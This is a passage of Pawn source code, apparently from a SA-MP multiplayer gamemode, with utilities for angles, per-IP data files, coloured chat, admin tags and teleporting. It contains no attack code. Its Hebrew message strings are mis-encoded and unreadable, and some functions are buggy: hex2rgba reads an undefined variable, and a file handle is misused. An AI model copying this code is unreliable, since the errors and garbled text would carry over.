stock GenerateRandomString(len,bool:useNumbers,bool:useEnglish,bool:useCEnglish,bool:useSymbols)
{
	new ret[128], allowedChars[128];
	if(useNumbers) allowedChars = "0123456789";
	if(useEnglish) format(allowedChars,sizeof(allowedChars),"%sabcdefghijklmnopqrstuvwxyz",allowedChars);
	if(useCEnglish) format(allowedChars,sizeof(allowedChars),"%sABCDEFGHIJKLMNOPQRSTUVWXYZ",allowedChars);
	if(useSymbols) format(allowedChars,sizeof(allowedChars),"%s!@#$^&*(){}[]-=+<>:,",allowedChars);
	for(new i = 0, m = strlen(allowedChars); i < len; i++) format(ret,sizeof(ret),"%s%c",ret,allowedChars[random(m)]);
	return ret;
}
//=[A_Angles]===================================================================
/*
	Functions from "a_angles.inc"
	by Tannz0rz
	Improved by me
*/
stock IsPlayerBehindPlayer(playerid, targetid, Float:dOffset)
{
	new Float:pa, Float:ta;
	if(!IsPlayerConnected(playerid) || !IsPlayerConnected(targetid)) return 0;
	GetPlayerFacingAngle(playerid,pa);
	GetPlayerFacingAngle(targetid,ta);
	return AngleInRangeOfAngle(pa, ta, dOffset) && IsPlayerFacingPlayer(playerid, targetid, dOffset);
}
stock SetPlayerToFacePlayer(playerid, targetid)
{
	new Float:pX, Float:pY, Float:pZ, Float:X, Float:Y, Float:Z, Float:ang;
	if(!IsPlayerConnected(playerid) || !IsPlayerConnected(targetid)) return 0;
	GetPlayerPos(targetid,X,Y,Z);
	GetPlayerPos(playerid,pX,pY,pZ);
	if(Y > pY) ang = (-acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);
	else if(Y < pY && X < pX) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 450.0);
	else if(Y < pY) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);
	if(X > pX) ang = (floatabs(floatabs(ang) + 180.0));
	else ang = (floatabs(ang) - 180.0);
	SetPlayerFacingAngle(playerid, ang);
 	return 1;
}
stock IsPlayerFacingPlayer(playerid, targetid, Float:dOffset)
{
	new Float:pX, Float:pY, Float:pZ, Float:pA, Float:X, Float:Y, Float:Z, Float:ang;
	if(!IsPlayerConnected(playerid) || !IsPlayerConnected(targetid)) return 0;
	GetPlayerPos(targetid,pX,pY,pZ);
	GetPlayerPos(playerid,X,Y,Z);
	GetPlayerFacingAngle(playerid,pA);
	if(Y > pY) ang = (-acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);
	else if(Y < pY && X < pX) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 450.0);
	else if(Y < pY) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);
	return AngleInRangeOfAngle(-ang, pA, dOffset);
}
stock AngleInRangeOfAngle(Float:a1, Float:a2, Float:rng)
{
	a1 -= a2;
	return (a1 < rng) && (a1 > -rng);
}
forward Float:SetPlayerToFacePos(playerid,Float:X,Float:Y);
stock Float:SetPlayerToFacePos(playerid,Float:X,Float:Y)
{
	new Float:pX, Float:pY, Float:pZ, Float:ang;
	GetPlayerPos(playerid,pX,pY,pZ);
	if(Y > pY) ang = (-acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);
	else if(Y < pY && X < pX) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 450.0);
	else if(Y < pY) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);
	ang = (X > pX ? (floatabs(floatabs(ang) + 180.0)) : (floatabs(ang) - 180.0)) + 180.0;
	SetPlayerFacingAngle(playerid,ang);
 	return ang;
}
//=[IsDataUsingIPExist]=========================================================
stock IsDataUsingIPExist(playerid,key[])
{
	new f[64];
	format(f,sizeof(f),folder_ipdata "%s.ini",GetIP(playerid));
	return !fexist(f) ? false : fkeyexist(f,key);
}
//=[SaveDataUsingIP]============================================================
stock SaveDataUsingIP(playerid,key[],value[])
{
	new f[64];
	format(f,sizeof(f),folder_ipdata "%s.ini",GetIP(playerid));
	if(!fexist(f)) fcreate(f);
	fsetstring(f,key,value);
}
//=[LoadDataUsingIP]============================================================
stock LoadDataUsingIP(playerid,key[],bool:del = false)
{
	new f[64], ret[M_S], File:handle, rem = 0;
	format(f,sizeof(f),folder_ipdata "%s.ini",GetIP(playerid));
	if(fexist(f) && fkeyexist(f,key))
	{
		format(ret,sizeof(ret),fgetstring(f,key));
		if(del)
		{
			fremovekey(f,key);
			handle = fopen(f,io_append);
			if(!flength(f)) rem = 1;
			fclose(f);
			if(rem) fremove(f);
		}
	}
	return ret;
}
//=[ColouredChat]===============================================================
stock ColouredChat(text[])
{
	new string[(128 + 32)], string2[(128 + 32 + 32)], tempString[16], pos = -1, x, last;
	strmid(string,text,0,128,sizeof(string));
	last = strlen(string);
	for(;x != sizeof(Colors);++x)
	{
		format(tempString,sizeof(tempString),"(%s)",Colors[x][colHebName]);
		while((pos = strfind(string,tempString,true,pos + 1)) != -1)
		{
			new	tempLen = strlen(tempString), tempVar, i = pos;
			if(x == sizeof(Colors)-1)
			{
				Colors[x][colHex] = rgba2hex(random(256),random(256),random(256),255);
				format(Colors[x][colHexStr],32,HexStringOfColor(Colors[x][colHex]));
			}
			format(tempString,sizeof(tempString),"{%s}",Colors[x][colHexStr]);
			if(tempLen < 8) for(new j; j != (8 - tempLen); ++j) strins(string," ",pos);
			for( ; ((string[i] != 0) && (tempVar != 8)) ; ++i, ++tempVar) string[i] = tempString[tempVar];
			if(tempLen > 8) strdel(string,i,i + (tempLen - 8));
			x = -1;
		}
		if(last == strlen(string))
		{
			format(tempString,sizeof(tempString),"(%s)",Colors[x][colName]);
			while((pos = strfind(string,tempString,true,pos + 1)) != -1)
			{
				new	tempLen = strlen(tempString), tempVar, i = pos;
				if(x == sizeof(Colors)-1)
				{
					Colors[x][colHex] = rgba2hex(random(256),random(256),random(256),255);
					format(Colors[x][colHexStr],32,HexStringOfColor(Colors[x][colHex]));
				}
				format(tempString,sizeof(tempString),"{%s}",Colors[x][colHexStr]);
				if(tempLen < 8) for(new j; j != (8 - tempLen); ++j) strins(string," ",pos);
				for( ; ((string[i] != 0) && (tempVar != 8)) ; ++i, ++tempVar) string[i] = tempString[tempVar];
				if(tempLen > 8) strdel(string,i,i + (tempLen - 8));
				x = -1;
			}
		}
		last = strlen(string);
	}
	format(string2,sizeof(string2),"%s{FFFFFF}",string);
	return string2;
}
//=[ColouredTag]================================================================
stock ColouredTag(playerid)
{
	new string[64], col[12];
	if(playerinfo[playerid][tagcol] == -1)
	{
		if(IsPlayerMAdmin(playerid))
		{
			switch(playerinfo[playerid][admin])
			{
				case 1..14: col = "{FF9900}";
				case 15..18: col = "{FF6E00}";
				case 19: col = "{00FFFF}";
				case 20: col = "{0000FF}";
				default: col = "{FFFFFF}";
			}
		}
		else if(PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) col = @c(yellow);
	}
	else format(col,sizeof(col),"{%s}",HexStringOfColor(playerinfo[playerid][tagcol]));
	format(string,sizeof(string),"%s%s{FFFFFF}",col,playerinfo[playerid][tag]);
	return string;
}
//=[AdminTag]===================================================================
stock AdminTag(playerid)
{
	new ret[32];
	switch(playerinfo[playerid][admin])
	{
		case 1: ret = "Probationary Admin";
		case 2..9: ret = "Admin";
		case 10..16: ret = "Senior Admin";
		case 17: ret = "Server Management";
		case 18: ret = "Server Management (+)";
		case 19: ret = "D. Server Manager";
		case 20: ret = "Server Manager";
		default: ret = "Unknown";
	}
	return ret;
}
//=[AdminColor]=================================================================
stock AdminColor(playerid)
{
	switch(playerinfo[playerid][admin])
	{
	    case 17,18: return red;
		case 19,20: return lightred;
		default: return lightblue;
	}
	return white;
}
//=[MixColors]==================================================================
stock MixColors(r1,g1,b1,r2,g2,b2) return rgba2hex((r1 + r2) / 2,(g1 + g2) / 2,(b1 + b2) / 2,255);
//=[hex2rgba]===================================================================
stock hex2rgba(hex,&r,&g,&b,&a)
{
	r = (hexColor >> 24) & 0x000000FF;
	g = (hexColor >> 16) & 0x000000FF;
	b = (hexColor >> 8) & 0x000000FF;
	a = hexColor & 0x000000FF;
}
//=[IntToHex]===================================================================
stock IntToHex(num)
{
	new ret[4];
	switch(num)
	{
		case 0: ret = "00";
		case 1: ret = "01";
		case 2: ret = "02";
		case 3: ret = "03";
		case 4: ret = "04";
		case 5: ret = "05";
		case 6: ret = "06";
		case 7: ret = "07";
		case 8: ret = "08";
		case 9: ret = "09";
		case 10: ret = "0A";
		case 11: ret = "0B";
		case 12: ret = "0C";
		case 13: ret = "0D";
		case 14: ret = "0E";
		case 15: ret = "0F";
		case 16: ret = "10";
		case 17: ret = "11";
		case 18: ret = "12";
		case 19: ret = "13";
		case 20: ret = "14";
		case 21: ret = "15";
		case 22: ret = "16";
		case 23: ret = "17";
		case 24: ret = "18";
		case 25: ret = "19";
		case 26: ret = "1A";
		case 27: ret = "1B";
		case 28: ret = "1C";
		case 29: ret = "1D";
		case 30: ret = "1E";
		case 31: ret = "1F";
		case 32: ret = "20";
		case 33: ret = "21";
		case 34: ret = "22";
		case 35: ret = "23";
		case 36: ret = "24";
		case 37: ret = "25";
		case 38: ret = "26";
		case 39: ret = "27";
		case 40: ret = "28";
		case 41: ret = "29";
		case 42: ret = "2A";
		case 43: ret = "2B";
		case 44: ret = "2C";
		case 45: ret = "2D";
		case 46: ret = "2E";
		case 47: ret = "2F";
		case 48: ret = "30";
		case 49: ret = "31";
		case 50: ret = "32";
		case 51: ret = "33";
		case 52: ret = "34";
		case 53: ret = "35";
		case 54: ret = "36";
		case 55: ret = "37";
		case 56: ret = "38";
		case 57: ret = "39";
		case 58: ret = "3A";
		case 59: ret = "3B";
		case 60: ret = "3C";
		case 61: ret = "3D";
		case 62: ret = "3E";
		case 63: ret = "3F";
		case 64: ret = "40";
		case 65: ret = "41";
		case 66: ret = "42";
		case 67: ret = "43";
		case 68: ret = "44";
		case 69: ret = "45";
		case 70: ret = "46";
		case 71: ret = "47";
		case 72: ret = "48";
		case 73: ret = "49";
		case 74: ret = "4A";
		case 75: ret = "4B";
		case 76: ret = "4C";
		case 77: ret = "4D";
		case 78: ret = "4E";
		case 79: ret = "4F";
		case 80: ret = "50";
		case 81: ret = "51";
		case 82: ret = "52";
		case 83: ret = "53";
		case 84: ret = "54";
		case 85: ret = "55";
		case 86: ret = "56";
		case 87: ret = "57";
		case 88: ret = "58";
		case 89: ret = "59";
		case 90: ret = "5A";
		case 91: ret = "5B";
		case 92: ret = "5C";
		case 93: ret = "5D";
		case 94: ret = "5E";
		case 95: ret = "5F";
		case 96: ret = "60";
		case 97: ret = "61";
		case 98: ret = "62";
		case 99: ret = "63";
		case 100: ret = "64";
		case 101: ret = "65";
		case 102: ret = "66";
		case 103: ret = "67";
		case 104: ret = "68";
		case 105: ret = "69";
		case 106: ret = "6A";
		case 107: ret = "6B";
		case 108: ret = "6C";
		case 109: ret = "6D";
		case 110: ret = "6E";
		case 111: ret = "6F";
		case 112: ret = "70";
		case 113: ret = "71";
		case 114: ret = "72";
		case 115: ret = "73";
		case 116: ret = "74";
		case 117: ret = "75";
		case 118: ret = "76";
		case 119: ret = "77";
		case 120: ret = "78";
		case 121: ret = "79";
		case 122: ret = "7A";
		case 123: ret = "7B";
		case 124: ret = "7C";
		case 125: ret = "7D";
		case 126: ret = "7E";
		case 127: ret = "7F";
		case 128: ret = "80";
		case 129: ret = "81";
		case 130: ret = "82";
		case 131: ret = "83";
		case 132: ret = "84";
		case 133: ret = "85";
		case 134: ret = "86";
		case 135: ret = "87";
		case 136: ret = "88";
		case 137: ret = "89";
		case 138: ret = "8A";
		case 139: ret = "8B";
		case 140: ret = "8C";
		case 141: ret = "8D";
		case 142: ret = "8E";
		case 143: ret = "8F";
		case 144: ret = "90";
		case 145: ret = "91";
		case 146: ret = "92";
		case 147: ret = "93";
		case 148: ret = "94";
		case 149: ret = "95";
		case 150: ret = "96";
		case 151: ret = "97";
		case 152: ret = "98";
		case 153: ret = "99";
		case 154: ret = "9A";
		case 155: ret = "9B";
		case 156: ret = "9C";
		case 157: ret = "9D";
		case 158: ret = "9E";
		case 159: ret = "9F";
		case 160: ret = "A0";
		case 161: ret = "A1";
		case 162: ret = "A2";
		case 163: ret = "A3";
		case 164: ret = "A4";
		case 165: ret = "A5";
		case 166: ret = "A6";
		case 167: ret = "A7";
		case 168: ret = "A8";
		case 169: ret = "A9";
		case 170: ret = "AA";
		case 171: ret = "AB";
		case 172: ret = "AC";
		case 173: ret = "AD";
		case 174: ret = "AE";
		case 175: ret = "AF";
		case 176: ret = "B0";
		case 177: ret = "B1";
		case 178: ret = "B2";
		case 179: ret = "B3";
		case 180: ret = "B4";
		case 181: ret = "B5";
		case 182: ret = "B6";
		case 183: ret = "B7";
		case 184: ret = "B8";
		case 185: ret = "B9";
		case 186: ret = "BA";
		case 187: ret = "BB";
		case 188: ret = "BC";
		case 189: ret = "BD";
		case 190: ret = "BE";
		case 191: ret = "BF";
		case 192: ret = "C0";
		case 193: ret = "C1";
		case 194: ret = "C2";
		case 195: ret = "C3";
		case 196: ret = "C4";
		case 197: ret = "C5";
		case 198: ret = "C6";
		case 199: ret = "C7";
		case 200: ret = "C8";
		case 201: ret = "C9";
		case 202: ret = "CA";
		case 203: ret = "CB";
		case 204: ret = "CC";
		case 205: ret = "CD";
		case 206: ret = "CE";
		case 207: ret = "CF";
		case 208: ret = "D0";
		case 209: ret = "D1";
		case 210: ret = "D2";
		case 211: ret = "D3";
		case 212: ret = "D4";
		case 213: ret = "D5";
		case 214: ret = "D6";
		case 215: ret = "D7";
		case 216: ret = "D8";
		case 217: ret = "D9";
		case 218: ret = "DA";
		case 219: ret = "DB";
		case 220: ret = "DC";
		case 221: ret = "DD";
		case 222: ret = "DE";
		case 223: ret = "DF";
		case 224: ret = "E0";
		case 225: ret = "E1";
		case 226: ret = "E2";
		case 227: ret = "E3";
		case 228: ret = "E4";
		case 229: ret = "E5";
		case 230: ret = "E6";
		case 231: ret = "E7";
		case 232: ret = "E8";
		case 233: ret = "E9";
		case 234: ret = "EA";
		case 235: ret = "EB";
		case 236: ret = "EC";
		case 237: ret = "ED";
		case 238: ret = "EE";
		case 239: ret = "EF";
		case 240: ret = "F0";
		case 241: ret = "F1";
		case 242: ret = "F2";
		case 243: ret = "F3";
		case 244: ret = "F4";
		case 245: ret = "F5";
		case 246: ret = "F6";
		case 247: ret = "F7";
		case 248: ret = "F8";
		case 249: ret = "F9";
		case 250: ret = "FA";
		case 251: ret = "FB";
		case 252: ret = "FC";
		case 253: ret = "FD";
		case 254: ret = "FE";
		case 255: ret = "FF";
	}
	return ret;
}
//=[DistanceCameraTargetToLocation]=============================================
stock Float:DistanceCameraTargetToLocation(Float:CamX, Float:CamY, Float:CamZ, Float:ObjX, Float:ObjY, Float:ObjZ, Float:FrX, Float:FrY, Float:FrZ)
{   // by RedShirt, improved by me
	new Float:TGTDistance = floatsqroot((CamX - ObjX) * (CamX - ObjX) + (CamY - ObjY) * (CamY - ObjY) + (CamZ - ObjZ) * (CamZ - ObjZ)),
	Float:tmpX = FrX * TGTDistance + CamX, Float:tmpY = FrY * TGTDistance + CamY, Float:tmpZ = FrZ * TGTDistance + CamZ;
	return floatsqroot((tmpX - ObjX) * (tmpX - ObjX) + (tmpY - ObjY) * (tmpY - ObjY) + (tmpZ - ObjZ) * (tmpZ - ObjZ));
}
//=[GetPointAngleToPoint]=======================================================
stock Float:GetPointAngleToPoint(Float:x2, Float:y2, Float:X, Float:Y)
{   // by niCe, improved by me
	new Float:DX = floatabs(floatsub(x2,X)), Float:DY = floatabs(floatsub(y2,Y)), Float:angle;
	if (DY == 0.0 || DX == 0.0)
	{
		if(DY == 0 && DX > 0) angle = 0.0;
		else if(DY == 0 && DX < 0) angle = 180.0;
		else if(DY > 0 && DX == 0) angle = 90.0;
		else if(DY < 0 && DX == 0) angle = 270.0;
		else if(DY == 0 && DX == 0) angle = 0.0;
	}
	else
	{
		angle = atan(DX/DY);
		if(X > x2 && Y <= y2) angle += 90.0;
		else if(X <= x2 && Y < y2) angle = floatsub(90.0, angle);
		else if(X < x2 && Y >= y2) angle -= 90.0;
		else if(X >= x2 && Y > y2) angle = floatsub(270.0, angle);
	}
	return floatadd(angle,90.0);
}
//=[GetXYInFrontOfPoint]========================================================
stock GetXYInFrontOfPoint(&Float:x, &Float:y, Float:angle, Float:distance) x += (distance * floatsin(-angle, degrees)), y += (distance * floatcos(-angle, degrees)); // by niCe, improved by me
//=[IsPlayerAimingAt]===========================================================
stock IsPlayerAimingAt(playerid, Float:x, Float:y, Float:z, Float:radius)
{   // by niCe, improved by me
	new Float:camera_x, Float:camera_y, Float:camera_z, Float:vector_x, Float:vector_y, Float:vector_z, Float:vertical, Float:horizontal;
	GetPlayerCameraPos(playerid,camera_x,camera_y,camera_z);
	GetPlayerCameraFrontVector(playerid,vector_x,vector_y,vector_z);
	switch(GetPlayerWeapon(playerid))
	{
		case 34, 35, 36: return DistanceCameraTargetToLocation(camera_x, camera_y, camera_z, x, y, z, vector_x, vector_y, vector_z) < radius;
		case 30, 31: vertical = 4.0, horizontal = -1.6;
		case 33: vertical = 2.7, horizontal = -1.0;
		default: vertical = 6.0, horizontal = -2.2;
	}
	new Float:angle = GetPointAngleToPoint(0,0,floatsqroot(vector_x*vector_x+vector_y*vector_y),vector_z) - 270.0;
	new Float:resize_x, Float:resize_y, Float:resize_z = floatsin(angle+vertical, degrees);
	GetXYInFrontOfPoint(resize_x,resize_y,GetPointAngleToPoint(0,0,vector_x,vector_y)+horizontal,floatcos(angle+vertical,degrees));
	return DistanceCameraTargetToLocation(camera_x,camera_y,camera_z,x,y,z,resize_x,resize_y,resize_z) < radius;
}
//=[IsPlayerAimingAtPlayer]=====================================================
stock IsPlayerAimingAtPlayer(playerid,targetplayerid)
{
	new Float:p[3];
	GetPlayerPos(targetplayerid,p[0],p[1],p[2]);
	return IsPlayerAimingAt(playerid,p[0],p[1],p[2],1.1);
}
//=[GetBattleState]=============================================================
stock GetBattleState(playerid, btype = 0)
{
	new Float:a, bstate[64];
	if(!btype)
	{
	    new Float:h;
		GetPlayerHealth(playerid,h);
		GetPlayerArmour(playerid,a);
		if(h >= 100 && a >= 100) bstate = @c(lightblue) "Ї°Їўш!";
		else if(h >= 100 && a >= 50) bstate = @c(lightblue) "юуфщэ!";
		else if(h >= 100 && a <= 49) bstate = @c(green) "·х·ч!";
		else if(h >= 90 && a <= 1) bstate = @c(orange) "Ёьчю· шхс!";
		else if(h >= 50 && h <= 89 && a <= 1) bstate = @c(yellow) "Ёчюу!";
		else if(h >= 20 && h <= 49 && a <= 1) bstate = @c(orange) "ыурщ ∙··рюя..!";
		else if(h <= 19 && a <= 1) bstate = @c(purple) "\"тэ суўф фыщ ўЎ°ф щ∙ 60 ∙Ёщх·...\"";
		else bstate = @c(grey) "ьр щухЄ";
	}
	else if(btype == 2)
	{
		GetVehicleHealth(GetPlayerVehicleID(playerid), a);
		if(a >= 1000) bstate = @c(lightblue) "Ї°Їўш!";
		else if(a >= 900) bstate = @c(lightblue) "юуфщэ!";
		else if(a <= 800) bstate = @c(green) "·х·ч!";
		else if(a <= 650) bstate = @c(orange) "Ёьчю· шхс!";
		else if(a <= 500) bstate = @c(yellow) "Ёчюу!";
		else if(a <= 380) bstate = @c(orange) "ыурщ ∙··рюя..!";
		else if(a <= 300) bstate = @c(purple) "\"тэ суўф фыщ ўЎ°ф щ∙ 60 ∙Ёщх·...\"";
		else bstate = @c(grey) "ьр щухЄ";
	}
	return bstate;
}
//=[Teleport]===================================================================
stock Teleport(playerid,teleid,expre=1)
{
	new string[M_S], Float:h, bool:jetp=false, tname[M_S], Float:p[3];
	if(expre)
	{
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·т° ыр∙° р·ф сюЎс");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·т° ыр∙° р·ф сЇЄщьх·");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф ссчщ°· фуюхщх·");
		if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф сў°с Ї°шщ");
		if(playerinfo[playerid][indrift]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф су°щЇш");
		if(playerinfo[playerid][inprace]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·т° ыр∙° р·ф сющ°хї Ї°шщ");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЁхє");
		if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх ыр∙° р·ф сюЄўс");
		if(playerinfo[playerid][incwar]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх ыр∙° р·ф сюьчю· ўьрЁщэ");
		if(playerinfo[playerid][mission] != INVALID_MISSION_ID) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·т° ыр∙° р·ф сю∙щюф");
		if(!CanTeleportSVehicle(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·т° Єэ ф°ыс фцф"), 0;
		if(playerinfo[playerid][srstarted] || playerinfo[playerid][srin]) return SendClientMessage(playerid,red," /srstop :ьр Ёщ·я ьф∙·т° ыр∙° р·ф сюшххч, ьфЇёўф ф∙·ю∙ сЇўхуф");
	    if(playerinfo[playerid][test] != -1) return SendClientMessage(playerid,red," /qtest :ьр Ёщ·я ьф∙·т° ыр∙° р·ф срцх° шёшщэ, ьщЎщрф"), 1;
		if(playerinfo[playerid][level] < Teleports[teleid][Tl])
		{
			format(string,sizeof(string)," .ыущ ьф∙·ю∙ с∙щтх° цф Єьщъ ьфщх· ьЇчх· с°юф %d",Teleports[teleid][Tl]);
			return playerinfo[playerid][level] == 0 ? (SendClientMessage(playerid,red,string), SendClientMessage(playerid,red," /Register :ыущ ьфщх· с°юф 1 Єьщъ ьф°∙э ь∙°· ∙ьЁх")) : SendClientMessage(playerid,red,string);
		}
		if(!Options[6][optActive] && Teleports[teleid][Ttype] == tele_private && playerinfo[playerid][vip] < 1) return SendClientMessage(playerid,red," .сьсу VIP ∙щтх° цф ∙юх° ью∙·ю∙щ");
		for(new i = 11; i <= 21; i += 5)
		{
			if(playerinfo[playerid][noticedmsg][i]) continue;
			else
			{
				switch(i)
				{
					case 11:
					{
						if(!playerinfo[playerid][setting][setting_telecam]) continue;
						SendClientMessage(playerid,grey," (/setting ?ьр рхфс р· рЇўш ф·цхцф юфющўхэ ∙ьъ ьющўхэ ∙ф∙·т°· рьщх)");
					}
					case 16: SendClientMessage(playerid,grey," (/tl :ыущ ьф∙·т° ь∙щтх° цф ∙хс, ф∙·ю∙ сЇўхуф фюўхЎ°·)");
					case 21: SendClientMessage(playerid,grey," (/rate !у°т р· ф∙щтх° ыущ ∙Ёхыь ьуЄ· Єу ыюф фхр шхс)");
				}
				playerinfo[playerid][noticedmsg][i] = 1;
				break;
			}
		}
	}
	if(playerinfo[playerid][dmzone] > dmz_none || playerinfo[playerid][tdmzone] > tdmz_none)
	{
		OutOfDMZone(playerid);
		LoadPlayerWeapons(playerid);
		if(playerinfo[playerid][ammuitems][ai_armour])
		{
			SetPlayerArmour(playerid,100.0);
			TakeAmmuItemAmmo(playerid,ai_armour);
		}
	}
	if(playerinfo[playerid][inshooting] != -1)
	{
		playerinfo[playerid][inshooting] = -1;
		DisablePlayerCheckpoint(playerid);
		LoadPlayerWeapons(playerid);
		SendClientMessage(playerid,red," .Shooting щЎр· ю");
	}
	if(playerinfo[playerid][instunting] != -1)
	{
		playerinfo[playerid][instunting] = -1;
		DisablePlayerCheckpoint(playerid);
		DisablePlayerRaceCheckpoint(playerid);
		LoadPlayerWeapons(playerid);
		SendClientMessage(playerid,green," .Stunting щЎр· ю");
	}
	if(playerinfo[playerid][incbug][0])
	{
		playerinfo[playerid][incbug] = {0,0,0,0};
		SendClientMessage(playerid,green," .C-Bug-щЎр· ю");
	}
	playerinfo[playerid][lasttele] = teleid;
	GetPlayerHealth(playerid,h);
	if(!playerinfo[playerid][gmtimer])
	{
		SetPlayerHealth(playerid,100000.0);
		playerinfo[playerid][gmtimer] = 2, playerinfo[playerid][gmlasthp] = h;
	}
	if(GetPlayerInterior(playerid) == Teleports[teleid][Ti] && playerinfo[playerid][setting][setting_telecam])
	{
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		InterpolateCameraPos(playerid,p[0],p[1],p[2],playerinfo[playerid][teleportingp][0] = floatdiv(p[0] + Teleports[teleid][Tx],2),playerinfo[playerid][teleportingp][1] = floatdiv(p[1] + Teleports[teleid][Ty],2),playerinfo[playerid][teleportingp][2] = floatadd(Teleports[teleid][Tz],30.0),1000,CAMERA_MOVE);
		playerinfo[playerid][interpolating][0] = 1, playerinfo[playerid][interpolating][1] = ipath_teleport;
	}
	else SetCameraBehindPlayer(playerid);
	if(Teleports[teleid][Twithv])
	{
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
			{
				jetp = GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK;
				SetPlayerPos(playerid,Teleports[teleid][Tx]+floatrand(-1.0,1.0),Teleports[teleid][Ty]+floatrand(-1.0,1.0),Teleports[teleid][Tz]);
				SetPlayerFacingAngle(playerid,Teleports[teleid][Ta]);
			}
			case PLAYER_STATE_DRIVER:
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),Teleports[teleid][Tx]+floatrand(-3.0,3.0),Teleports[teleid][Ty]+floatrand(-3.0,3.0),Teleports[teleid][Tz],playerid);
				SetVehicleZAngle(GetPlayerVehicleID(playerid),Teleports[teleid][Ta]);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),Teleports[teleid][Ti]);
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),Teleports[teleid][Tw]);
				jetp = false;
			}
		}
	}
	else
	{
		jetp = GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK? true:false;
		SetPlayerPos(playerid,Teleports[teleid][Tx]+floatrand(-1.0,1.0),Teleports[teleid][Ty]+floatrand(-1.0,1.0),Teleports[teleid][Tz]);
		SetPlayerFacingAngle(playerid,Teleports[teleid][Ta]);
	}
	SetCameraBehindPlayer(playerid);
	ReloadCPs(playerid);
	Streamer_Update(playerid);
	SetPlayerInterior(playerid,Teleports[teleid][Ti]);
	SetPlayerVirtualWorld(playerid,Teleports[teleid][Tw]);
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][spectate] == playerid)
	{
		TogglePlayerSpectating(i,0);
		SetPlayerInterior(i,GetPlayerInterior(playerid));
		TogglePlayerSpectating(i,1);
		PlayerSpectatePlayer(i,playerid);
	}
	if(Teleports[teleid][TAC] > 0) playerinfo[playerid][dontac] += Teleports[teleid][TAC];
	strmid(tname,Teleports[teleid][Tcmd],1,strlen(Teleports[teleid][Tcmd]));
	format(string,sizeof(string),"~y~] ~h~%s ~y~]",tname);
	GameTextForPlayer(playerid,string,1500,4);
	if(jetp) GiveJetpack(playerid);
	if(Teleports[teleid][Tfreeze] && !playerinfo[playerid][unftimer])
	{
		if(!playerinfo[playerid][frozen][0]) playerinfo[playerid][unftimer] = 2;
		SetFreeze(playerid,1);
	}
	/* if the dynamic areas thingy will not work, use this one
	if(Teleports[teleid][Tnoshooting] && tmp != -1 && !Teleports[tmp][Tnoshooting])
	{
		new c = SavePlayerWeapons(playerid);
		if(c > 0)
		{
			ResetWeapons(playerid);
			if(playerinfo[playerid][noticedmsg][19] != teleid)
			{
				SendClientMessage(playerid,darkred," .∙щэ ьс: рёх° ьщ°х· с∙щтх° цф. Ё∙ўщщъ Ё∙ю°х хщхчц°х рьщъ ы∙·Ўр ююЁх");
				playerinfo[playerid][noticedmsg][19] = teleid;
			}
		}
		else SendClientMessage(playerid,darkred," .∙щэ ьс: рёх° ьщ°х· с∙щтх° цф");
	}
	else if(tmp != -1 && Teleports[tmp][Tnoshooting] && !Teleports[teleid][Tnoshooting])
	{
		new c = CountSavedWeapons(playerid);
		if(c > 0)
		{
			LoadPlayerWeapons(playerid);
			if(playerinfo[playerid][noticedmsg][20] != teleid)
			{
				format(string,sizeof(string)," .фхчц°х ,%s ф∙щтх°щэ ∙Ёьўчх ююъ ы∙ф∙·т°· ь∙щтх°",Teleports[tmp][Tcmd]);
				SendClientMessage(playerid,green,string);
				playerinfo[playerid][noticedmsg][20] = teleid;
			}
		}
	}*/
	if(!playerinfo[playerid][fmsg][0]) playerinfo[playerid][fmsg][0] = 600, playerinfo[playerid][fmsggo][0] = 10, playerinfo[playerid][fmsgparam] = teleid;
	PlaySound(playerid,1132);
	return 1;
}
//=[IsPlayerInWarTeleport]======================================================
stock IsPlayerInWarTeleport(playerid)
{
	for(new i = 0; i < sizeof(Teleports); i++) if(Teleports[i][Ttype] == tele_war) if(IsPlayerInRangeOfPoint(playerid,50.0,Teleports[i][Tx],Teleports[i][Ty],Teleports[i][Tz])) return 1;
	return 0;
}
//=[split]======================================================================
stock split(const strsrc[],strdest[][],delimiter)
{
	new i, li, aNum, len, len2 = strlen(strsrc);
	while(i <= len2)
	{
